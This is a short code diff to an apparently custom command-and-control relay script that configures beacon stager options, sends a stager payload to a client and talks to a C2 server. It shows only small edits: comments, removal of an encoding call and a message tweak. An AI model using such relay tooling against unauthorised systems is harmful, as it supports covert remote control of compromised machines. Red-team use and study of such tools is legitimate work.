@@ -174,6 +174,8 @@ class commonUtils(object):
 class configureStage(object):
 	@staticmethod	
 	def configureOptions(sock, arch, pipename, block):
+		# This whole function should eventually be refactored into an elaborate forloop so that we can
+		#   support additional beacon options down the road
 		# send the options
 		if args.verbose:
 			print commonUtils.color("Configuring stager options")
@@ -218,12 +220,12 @@ class configureStage(object):
 		# Prep stager payload
 		if args.verbose:
 			print commonUtils.color("Encoding stager payload")
-		prep_stager = commonUtils.prepData(stager_payload)
+			# Trick, this is actually done during sendData()
 
 		# Send stager to the client
 		if args.verbose:
 			print commonUtils.color("Sending stager to client")
-		commonUtils.sendData(prep_stager)
+		commonUtils.sendData(stager_payload)
 
 		# Rrieve the metadata we need to relay back to the server
 		if args.verbose:
@@ -380,7 +382,7 @@ def main():
 			# Restart this loop
 	except KeyboardInterrupt:
 		if args.debug:
-			print commonUtils.color("Closing the socket to the c2 server")
+			print commonUtils.color("\nClosing the socket to the c2 server")
 		commonUtils.killSocket(sock)
 		print commonUtils.color("\nExiting...", warning=True)
 		sys.exit(0)
